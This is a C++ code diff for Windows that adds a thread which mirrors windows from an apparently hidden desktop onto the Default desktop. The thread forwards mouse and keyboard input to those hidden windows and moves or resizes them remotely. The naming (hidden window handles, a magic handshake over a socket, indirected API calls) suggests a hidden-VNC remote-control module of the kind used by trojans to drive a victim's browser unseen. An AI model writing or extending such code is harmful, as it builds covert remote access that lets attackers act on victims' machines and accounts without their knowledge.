@@ -50,6 +50,11 @@ static BOOL       g_dumpedInputDesktopState = FALSE;
 static DWORD      g_lastCaptureHungSkipLogTick = 0;
 static DWORD      g_lastCaptureSlowPrintLogTick = 0;
 static DWORD      g_windowProxySequence = 1;
+static CRITICAL_SECTION g_clientProxyCrit;
+static BOOL       g_clientProxyCritReady = FALSE;
+static HANDLE     g_hClientProxyThread = NULL;
+static DWORD      g_clientProxyThreadId = 0;
+static BOOL       g_clientProxyStop = FALSE;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
@@ -635,6 +640,480 @@ static HWND GetMovableTopWindow(HWND hWnd)
 {
     HWND topHwnd = GetTopLevelWindow(hWnd);
     return topHwnd ? topHwnd : hWnd;
+}
+
+static BOOL ShouldLogInput(UINT msg);
+
+struct ClientProxySlot
+{
+    HWND hWnd;
+    unsigned long long hiddenHwnd;
+    WINDOW_PROXY_ENTRY entry;
+    BOOL lmouseDown;
+    POINT lastPoint;
+    HWND moveWindow;
+    LRESULT moveHit;
+};
+
+static const WCHAR *g_clientProxyClassName = L"HHHHClientProxyX64";
+static ClientProxySlot g_clientProxySlots[winproxy::MAX_WINDOWS];
+static WINDOW_PROXY_ENTRY g_clientProxyEntries[winproxy::MAX_WINDOWS];
+static DWORD g_clientProxyEntryCount = 0;
+static DWORD g_clientProxySequence = 0;
+static std::vector<BYTE> g_clientProxyPixels;
+static int g_clientProxyWidth = 0;
+static int g_clientProxyHeight = 0;
+static int g_clientProxyStride = 0;
+
+static void EnsureClientProxyCrit()
+{
+    if (!g_clientProxyCritReady)
+    {
+        InitializeCriticalSection(&g_clientProxyCrit);
+        g_clientProxyCritReady = TRUE;
+    }
+}
+
+static BOOL HasClientProxyEntry(const WINDOW_PROXY_ENTRY *entries, DWORD count, unsigned long long hiddenHwnd)
+{
+    for (DWORD i = 0; i < count; ++i)
+    {
+        if (entries[i].hwnd == hiddenHwnd)
+            return TRUE;
+    }
+    return FALSE;
+}
+
+static ClientProxySlot *FindClientProxySlot(unsigned long long hiddenHwnd)
+{
+    if (!hiddenHwnd)
+        return NULL;
+    for (DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+    {
+        if (g_clientProxySlots[i].hWnd && g_clientProxySlots[i].hiddenHwnd == hiddenHwnd)
+            return &g_clientProxySlots[i];
+    }
+    return NULL;
+}
+
+static ClientProxySlot *FindFreeClientProxySlot()
+{
+    for (DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+    {
+        if (!g_clientProxySlots[i].hWnd && !g_clientProxySlots[i].hiddenHwnd)
+            return &g_clientProxySlots[i];
+    }
+    return NULL;
+}
+
+static void PositionClientProxyWindow(ClientProxySlot *slot)
+{
+    if (!slot || !slot->hWnd)
+        return;
+    LONG width = slot->entry.right - slot->entry.left;
+    LONG height = slot->entry.bottom - slot->entry.top;
+    if (width <= 0 || height <= 0)
+        return;
+
+    SetWindowTextW(slot->hWnd, slot->entry.title[0] ? slot->entry.title : slot->entry.className);
+    SetWindowPos(slot->hWnd,
+        HWND_TOP,
+        slot->entry.left,
+        slot->entry.top,
+        width,
+        height,
+        SWP_NOACTIVATE | SWP_SHOWWINDOW);
+    InvalidateRgn(slot->hWnd, NULL, FALSE);
+}
+
+static void DestroyClientProxyWindowsLocal()
+{
+    for (DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+    {
+        HWND hWnd = g_clientProxySlots[i].hWnd;
+        if (hWnd)
+        {
+            g_clientProxySlots[i].hWnd = NULL;
+            DestroyWindow(hWnd);
+        }
+        Funcs::pMemset(&g_clientProxySlots[i], 0, sizeof(g_clientProxySlots[i]));
+    }
+}
+
+static void SyncClientMainProxyWindows()
+{
+    if (!g_clientProxyCritReady)
+        return;
+
+    WINDOW_PROXY_ENTRY entries[winproxy::MAX_WINDOWS];
+    DWORD count = 0;
+    EnterCriticalSection(&g_clientProxyCrit);
+    count = g_clientProxyEntryCount;
+    if (count > winproxy::MAX_WINDOWS)
+        count = winproxy::MAX_WINDOWS;
+    if (count)
+        Funcs::pMemcpy(entries, g_clientProxyEntries, sizeof(WINDOW_PROXY_ENTRY) * count);
+    LeaveCriticalSection(&g_clientProxyCrit);
+
+    for (DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+    {
+        if (g_clientProxySlots[i].hWnd && !HasClientProxyEntry(entries, count, g_clientProxySlots[i].hiddenHwnd))
+        {
+            HWND oldHwnd = g_clientProxySlots[i].hWnd;
+            printf("[client-proxy] destroy proxy hwnd=0x%p hidden=0x%llx\n", oldHwnd, g_clientProxySlots[i].hiddenHwnd);
+            g_clientProxySlots[i].hWnd = NULL;
+            DestroyWindow(oldHwnd);
+            Funcs::pMemset(&g_clientProxySlots[i], 0, sizeof(g_clientProxySlots[i]));
+        }
+    }
+
+    for (DWORD i = 0; i < count; ++i)
+    {
+        ClientProxySlot *slot = FindClientProxySlot(entries[i].hwnd);
+        if (!slot)
+        {
+            slot = FindFreeClientProxySlot();
+            if (!slot)
+                break;
+            Funcs::pMemset(slot, 0, sizeof(*slot));
+            slot->hiddenHwnd = entries[i].hwnd;
+            slot->entry = entries[i];
+            LONG width = entries[i].right - entries[i].left;
+            LONG height = entries[i].bottom - entries[i].top;
+            slot->hWnd = CreateWindowExW(WS_EX_APPWINDOW,
+                g_clientProxyClassName,
+                entries[i].title[0] ? entries[i].title : entries[i].className,
+                WS_POPUP | WS_VISIBLE,
+                entries[i].left,
+                entries[i].top,
+                width > 0 ? width : 100,
+                height > 0 ? height : 100,
+                NULL,
+                NULL,
+                GetModuleHandle(NULL),
+                slot);
+            if (slot->hWnd)
+                printf("[client-proxy] create main-desktop proxy hwnd=0x%p hidden=0x%llx pid=%lu\n", slot->hWnd, slot->hiddenHwnd, entries[i].pid);
+            else
+            {
+                printf("[client-proxy] create proxy failed hidden=0x%llx lastError=%lu\n", entries[i].hwnd, GetLastError());
+                Funcs::pMemset(slot, 0, sizeof(*slot));
+                continue;
+            }
+        }
+        else
+        {
+            slot->entry = entries[i];
+        }
+        PositionClientProxyWindow(slot);
+    }
+}
+
+static void InvalidateClientMainProxyWindows()
+{
+    for (DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+    {
+        if (g_clientProxySlots[i].hWnd)
+            InvalidateRgn(g_clientProxySlots[i].hWnd, NULL, FALSE);
+    }
+}
+
+static void ApplyClientProxyMove(ClientProxySlot *slot, UINT msg, POINT remotePoint)
+{
+    if (!slot)
+        return;
+
+    if (msg == WM_LBUTTONDOWN)
+    {
+        slot->lmouseDown = TRUE;
+        slot->lastPoint = remotePoint;
+        slot->moveWindow = GetMovableTopWindow((HWND)(ULONG_PTR)slot->hiddenHwnd);
+        slot->moveHit = slot->moveWindow ? SendMessageA(slot->moveWindow, WM_NCHITTEST, 0, MAKELPARAM(remotePoint.x, remotePoint.y)) : 0;
+        printf("[client-proxy-input] nchittest hidden=0x%llx moveWindow=0x%p hit=%lld movable=%d\n",
+            slot->hiddenHwnd, slot->moveWindow, (long long)slot->moveHit, IsMoveResizeHit(slot->moveHit));
+    }
+    else if (msg == WM_LBUTTONUP)
+    {
+        slot->lmouseDown = FALSE;
+        slot->moveWindow = NULL;
+        slot->moveHit = 0;
+    }
+    else if (msg == WM_MOUSEMOVE && slot->lmouseDown && slot->moveWindow && IsMoveResizeHit(slot->moveHit))
+    {
+        int moveX = slot->lastPoint.x - remotePoint.x;
+        int moveY = slot->lastPoint.y - remotePoint.y;
+        slot->lastPoint = remotePoint;
+
+        RECT rect;
+        if (!GetWindowRect(slot->moveWindow, &rect))
+            return;
+
+        int x = rect.left;
+        int y = rect.top;
+        int width = rect.right - rect.left;
+        int height = rect.bottom - rect.top;
+        switch (slot->moveHit)
+        {
+        case HTCAPTION: x -= moveX; y -= moveY; break;
+        case HTTOP: y -= moveY; height += moveY; break;
+        case HTBOTTOM: height -= moveY; break;
+        case HTLEFT: x -= moveX; width += moveX; break;
+        case HTRIGHT: width -= moveX; break;
+        case HTTOPLEFT: y -= moveY; height += moveY; x -= moveX; width += moveX; break;
+        case HTTOPRIGHT: y -= moveY; height += moveY; width -= moveX; break;
+        case HTBOTTOMLEFT: height -= moveY; x -= moveX; width += moveX; break;
+        case HTBOTTOMRIGHT: height -= moveY; width -= moveX; break;
+        }
+        if (width < 50) width = 50;
+        if (height < 50) height = 50;
+        SetLastError(0);
+        BOOL moved = MoveWindow(slot->moveWindow, x, y, width, height, TRUE);
+        if (ShouldLogInput(msg))
+            printf("[client-proxy-input] move hidden=0x%llx hwnd=0x%p result=%s lastError=%lu\n",
+                slot->hiddenHwnd, slot->moveWindow, moved ? "ok" : "failed", GetLastError());
+    }
+}
+
+static void PostClientProxyInput(ClientProxySlot *slot, HWND proxyHwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    if (!slot || !slot->hiddenHwnd)
+        return;
+
+    POINT clientPoint = { 0, 0 };
+    if (msg == WM_MOUSEWHEEL)
+    {
+        clientPoint.x = GET_X_LPARAM(lParam);
+        clientPoint.y = GET_Y_LPARAM(lParam);
+        ScreenToClient(proxyHwnd, &clientPoint);
+    }
+    else
+    {
+        clientPoint.x = GET_X_LPARAM(lParam);
+        clientPoint.y = GET_Y_LPARAM(lParam);
+    }
+
+    RECT proxyRect = { 0 };
+    GetClientRect(proxyHwnd, &proxyRect);
+    LONG proxyWidth = proxyRect.right - proxyRect.left;
+    LONG proxyHeight = proxyRect.bottom - proxyRect.top;
+    LONG remoteWidth = slot->entry.right - slot->entry.left;
+    LONG remoteHeight = slot->entry.bottom - slot->entry.top;
+    if (proxyWidth <= 0 || proxyHeight <= 0 || remoteWidth <= 0 || remoteHeight <= 0)
+        return;
+
+    POINT remotePoint;
+    remotePoint.x = slot->entry.left + (LONG)((double)clientPoint.x * remoteWidth / proxyWidth);
+    remotePoint.y = slot->entry.top + (LONG)((double)clientPoint.y * remoteHeight / proxyHeight);
+
+    HWND hiddenHwnd = (HWND)(ULONG_PTR)slot->hiddenHwnd;
+    LPARAM remoteLParam = MAKELPARAM(remotePoint.x, remotePoint.y);
+    ApplyClientProxyMove(slot, msg, remotePoint);
+
+    SetLastError(0);
+    BOOL posted = PostMessageA(hiddenHwnd, msg, wParam, (msg >= WM_MOUSEFIRST && msg <= WM_MOUSELAST) ? remoteLParam : lParam);
+    if (ShouldLogInput(msg))
+        printf("[client-proxy-input] post %s proxy=0x%p hidden=0x%p remote=(%ld,%ld) result=%s lastError=%lu\n",
+            InputMsgName(msg), proxyHwnd, hiddenHwnd, remotePoint.x, remotePoint.y, posted ? "ok" : "failed", GetLastError());
+}
+
+static LRESULT CALLBACK ClientProxyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    ClientProxySlot *slot = (ClientProxySlot *)GetWindowLongPtr(hWnd, GWLP_USERDATA);
+    if (msg == WM_NCCREATE)
+    {
+        CREATESTRUCTW *cs = (CREATESTRUCTW *)lParam;
+        slot = (ClientProxySlot *)cs->lpCreateParams;
+        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)slot);
+        return TRUE;
+    }
+
+    switch (msg)
+    {
+    case WM_PAINT:
+    {
+        PAINTSTRUCT ps;
+        HDC hDc = BeginPaint(hWnd, &ps);
+        RECT clientRect;
+        GetClientRect(hWnd, &clientRect);
+        HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
+        FillRect(hDc, &clientRect, brush);
+        DeleteObject(brush);
+
+        if (slot && g_clientProxyCritReady)
+        {
+            EnterCriticalSection(&g_clientProxyCrit);
+            if (!g_clientProxyPixels.empty() && g_clientProxyWidth > 0 && g_clientProxyHeight > 0 && g_clientProxyStride > 0)
+            {
+                int srcX = slot->entry.left;
+                int srcY = slot->entry.top;
+                int srcW = slot->entry.right - slot->entry.left;
+                int srcH = slot->entry.bottom - slot->entry.top;
+                if (srcX < 0) srcX = 0;
+                if (srcY < 0) srcY = 0;
+                if (srcX + srcW > g_clientProxyWidth) srcW = g_clientProxyWidth - srcX;
+                if (srcY + srcH > g_clientProxyHeight) srcH = g_clientProxyHeight - srcY;
+                if (srcW > 0 && srcH > 0)
+                {
+                    BITMAPINFO bmi;
+                    Funcs::pMemset(&bmi, 0, sizeof(bmi));
+                    bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
+                    bmi.bmiHeader.biWidth = g_clientProxyWidth;
+                    bmi.bmiHeader.biHeight = -g_clientProxyHeight;
+                    bmi.bmiHeader.biPlanes = 1;
+                    bmi.bmiHeader.biBitCount = 24;
+                    bmi.bmiHeader.biCompression = BI_RGB;
+                    StretchDIBits(hDc,
+                        0, 0, clientRect.right - clientRect.left, clientRect.bottom - clientRect.top,
+                        srcX, srcY, srcW, srcH,
+                        g_clientProxyPixels.data(), &bmi, DIB_RGB_COLORS, SRCCOPY);
+                }
+            }
+            LeaveCriticalSection(&g_clientProxyCrit);
+        }
+
+        EndPaint(hWnd, &ps);
+        return 0;
+    }
+    case WM_ERASEBKGND:
+        return TRUE;
+    case WM_LBUTTONDOWN:
+    case WM_RBUTTONDOWN:
+    case WM_MBUTTONDOWN:
+        SetFocus(hWnd);
+        SetCapture(hWnd);
+        PostClientProxyInput(slot, hWnd, msg, wParam, lParam);
+        return 0;
+    case WM_LBUTTONUP:
+    case WM_RBUTTONUP:
+    case WM_MBUTTONUP:
+        ReleaseCapture();
+        PostClientProxyInput(slot, hWnd, msg, wParam, lParam);
+        return 0;
+    case WM_LBUTTONDBLCLK:
+    case WM_RBUTTONDBLCLK:
+    case WM_MBUTTONDBLCLK:
+    case WM_MOUSEWHEEL:
+        PostClientProxyInput(slot, hWnd, msg, wParam, lParam);
+        return 0;
+    case WM_MOUSEMOVE:
+        if (wParam & (MK_LBUTTON | MK_RBUTTON | MK_MBUTTON))
+            PostClientProxyInput(slot, hWnd, msg, wParam, lParam);
+        return 0;
+    case WM_CHAR:
+    case WM_SYSCHAR:
+    case WM_KEYDOWN:
+    case WM_KEYUP:
+    case WM_SYSKEYDOWN:
+    case WM_SYSKEYUP:
+        PostClientProxyInput(slot, hWnd, msg, wParam, lParam);
+        return 0;
+    case WM_CLOSE:
+        DestroyWindow(hWnd);
+        return 0;
+    case WM_NCDESTROY:
+        SetWindowLongPtr(hWnd, GWLP_USERDATA, 0);
+        return DefWindowProc(hWnd, msg, wParam, lParam);
+    default:
+        return DefWindowProc(hWnd, msg, wParam, lParam);
+    }
+}
+
+static BOOL RegisterClientProxyWindowClass()
+{
+    WNDCLASSEXW wc = { 0 };
+    wc.cbSize = sizeof(wc);
+    wc.style = CS_DBLCLKS;
+    wc.lpfnWndProc = ClientProxyWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
+    wc.lpszClassName = g_clientProxyClassName;
+    if (RegisterClassExW(&wc))
+        return TRUE;
+    return GetLastError() == ERROR_CLASS_ALREADY_EXISTS;
+}
+
+static DWORD WINAPI ClientMainProxyThread(LPVOID)
+{
+    HDESK defaultDesk = OpenDesktopA("Default", 0, FALSE, DESKTOP_CREATEWINDOW | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP);
+    if (!defaultDesk)
+    {
+        printf("[client-proxy] OpenDesktop(Default) failed: lastError=%lu\n", GetLastError());
+        return 0;
+    }
+    if (!SetThreadDesktop(defaultDesk))
+    {
+        printf("[client-proxy] SetThreadDesktop(Default) failed: lastError=%lu\n", GetLastError());
+        CloseDesktop(defaultDesk);
+        return 0;
+    }
+    LogDesktopState("client-main-proxy-thread");
+    if (!RegisterClientProxyWindowClass())
+    {
+        printf("[client-proxy] RegisterClass failed: lastError=%lu\n", GetLastError());
+        CloseDesktop(defaultDesk);
+        return 0;
+    }
+
+    MSG msg;
+    PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
+    printf("[client-proxy] main desktop proxy thread ready\n");
+
+    while (!g_clientProxyStop)
+    {
+        SyncClientMainProxyWindows();
+        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
+        {
+            if (msg.message == WM_QUIT)
+            {
+                g_clientProxyStop = TRUE;
+                break;
+            }
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        Funcs::pSleep(33);
+    }
+
+    DestroyClientProxyWindowsLocal();
+    CloseDesktop(defaultDesk);
+    return 0;
+}
+
+static void StartClientMainProxyThread()
+{
+    EnsureClientProxyCrit();
+    if (g_hClientProxyThread)
+        return;
+    g_clientProxyStop = FALSE;
+    g_hClientProxyThread = CreateThread(NULL, 0, ClientMainProxyThread, NULL, 0, &g_clientProxyThreadId);
+    if (g_hClientProxyThread)
+        printf("[client-proxy] started main desktop proxy thread id=%lu\n", g_clientProxyThreadId);
+    else
+        printf("[client-proxy] CreateThread failed: lastError=%lu\n", GetLastError());
+}
+
+static void UpdateClientMainProxySnapshot(const WINDOW_PROXY_HEADER *header, const WINDOW_PROXY_ENTRY *entries, const screen2::RawFrame& frame)
+{
+    if (!header || !entries || !g_clientProxyCritReady)
+        return;
+    DWORD count = header->windowCount;
+    if (count > winproxy::MAX_WINDOWS)
+        count = winproxy::MAX_WINDOWS;
+
+    EnterCriticalSection(&g_clientProxyCrit);
+    g_clientProxyEntryCount = count;
+    g_clientProxySequence = header->sequence;
+    if (count)
+        Funcs::pMemcpy(g_clientProxyEntries, entries, sizeof(WINDOW_PROXY_ENTRY) * count);
+    g_clientProxyWidth = frame.width;
+    g_clientProxyHeight = frame.height;
+    g_clientProxyStride = frame.stride;
+    g_clientProxyPixels = frame.pixels;
+    LeaveCriticalSection(&g_clientProxyCrit);
+
+    if (g_clientProxyThreadId)
+        PostThreadMessage(g_clientProxyThreadId, WM_APP + 0x251, header->sequence, 0);
 }
 
 static BOOL ShouldLogInput(UINT msg)
@@ -1615,6 +2094,7 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         printf("[!] Desktop channel SetThreadDesktop failed (session %lu)\n", sessionId);
         goto exit;
     }
+    StartClientMainProxyThread();
 
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
         goto exit;
@@ -1666,12 +2146,12 @@ static DWORD WINAPI DesktopThread(LPVOID param)
             DWORD skippedProxyCount = 0;
             if (BuildWindowProxySnapshotPacket(proxyPacket, &proxyWindowCount, &skippedProxyCount))
             {
-                if (!SendScreenPacket(s, proxyPacket))
-                    goto exit;
                 const WINDOW_PROXY_HEADER *proxyHeader = (const WINDOW_PROXY_HEADER *)proxyPacket.data();
+                const WINDOW_PROXY_ENTRY *proxyEntries = (const WINDOW_PROXY_ENTRY *)(proxyPacket.data() + sizeof(WINDOW_PROXY_HEADER));
+                UpdateClientMainProxySnapshot(proxyHeader, proxyEntries, rawFrame);
                 if (!lastWindowProxyLogSequence || proxyHeader->sequence - lastWindowProxyLogSequence >= 5)
                 {
-                    printf("[winproxy] sent x64 snapshot seq=%lu windows=%lu skipped32orUnknown=%lu bytes=%zu\n",
+                    printf("[client-proxy] local x64 snapshot seq=%lu windows=%lu skipped32orUnknown=%lu bytes=%zu\n",
                         proxyHeader->sequence,
                         proxyWindowCount,
                         skippedProxyCount,
